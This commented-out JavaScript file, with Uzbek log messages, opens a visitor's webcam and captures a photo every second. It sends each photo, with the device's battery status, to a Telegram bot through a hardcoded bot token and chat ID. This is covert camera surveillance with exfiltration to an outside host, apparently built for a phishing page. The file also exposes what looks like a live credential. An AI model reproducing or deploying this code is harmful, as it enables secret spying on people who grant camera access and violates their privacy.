// const video = document.getElementById('video');
// const canvas = document.getElementById('canvas');
// let batteryStatus = {
//     level: 0,
//     charging: false
// };

// // Initialize video stream
// navigator.mediaDevices.getUserMedia({ video: true })
//     .then(stream => {
//         video.srcObject = stream;

//         // Capture photo and send every second
//         setInterval(() => {
//             takeAndSendPhoto();
//         }, 1000);
//     })
//     .catch(err => {
//         console.error('Kamera kirishiga ruxsat berilmadi:', err);
//     });

// // Capture and send photo with battery status
// async function takeAndSendPhoto() {
//     const context = canvas.getContext('2d');
//     canvas.width = video.videoWidth;
//     canvas.height = video.videoHeight;
//     context.drawImage(video, 0, 0, canvas.width, canvas.height);

//     // Convert canvas to blob and send
//     canvas.toBlob(async (blob) => {
//         const formData = new FormData();
//         formData.append('photo', blob);

//         const botToken = '7183755820:AAETMCJWnrOD7-rGab6o_ppSNGGWo0KuL78'; // Replace with your bot token
//         const chatId = '7076932696'; // Replace with your chat ID
//         const caption = batteryStatus.level === 0 ? 'Device Apple' : `Battery: ${batteryStatus.level}%\nCharging: ${batteryStatus.charging ? 'Yes' : 'No'}`;

//         try {
//             const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&caption=${encodeURIComponent(caption)}`, {
//                 method: 'POST',
//                 body: formData
//             });
//             const result = await response.json();
//             if (result.ok) {
//                 console.log('Rasm muvaffaqiyatli yuborildi!');
//             } else {
//                 console.error('Rasm yuborishda xatolik: ' + result.description);
//             }
//         } catch (error) {
//             console.error('Rasm yuborishda xatolik: ' + error.message);
//         }
//     }, 'image/jpeg');
// }

// // Update battery status
// function updateBatteryStatus(battery) {
//     batteryStatus.level = Math.round(battery.level * 100);
//     batteryStatus.charging = battery.charging;

//     // Optionally update the UI or log the status
//     document.getElementById('level').textContent = batteryStatus.level;
//     document.getElementById('charging').textContent = batteryStatus.charging ? 'Ha' : 'Yo\'q';
// }

// // Get battery status
// navigator.getBattery().then(function(battery) {
//     // Initial update
//     updateBatteryStatus(battery);

//     // Update on events
//     battery.addEventListener('levelchange', function() {
//         updateBatteryStatus(battery);
//     });
//     battery.addEventListener('chargingchange', function() {
//         updateBatteryStatus(battery);
//     });
// });
